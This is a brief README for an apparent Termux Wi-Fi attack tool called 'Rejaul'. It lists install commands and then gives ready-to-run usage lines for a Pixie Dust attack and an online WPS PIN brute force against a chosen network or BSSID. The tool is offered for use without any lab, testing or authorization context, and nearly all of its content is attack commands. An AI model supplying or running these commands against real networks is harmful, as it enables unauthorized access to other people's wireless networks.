# Rejaul

pkg install -y root-repo

pkg install -y git tsu python wpa-supplicant pixiewps iw

git clone https://github.com/Rejaul/Rejaul.git

$ cd Rejaul

$ chmod +x *

$ python Rejaul.py -h

plz' go to HOME

Example : sudo python Rejaul/Rejaul.py -i wlan0 -K

Note:

First turn off your Wifi.

Show avaliable networks and start Pixie Dust attack on a specified network.

sudo python Rejaul.py -i wlan0 -K

Start Pixie Dust attack on a specified BSSID:

sudo python Rejaul.py -i wlan0 -b 00:91:4C:C3:AC:28 -K

Launch online WPS bruteforce with the specified first half of the PIN:

sudo python Rejaul.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
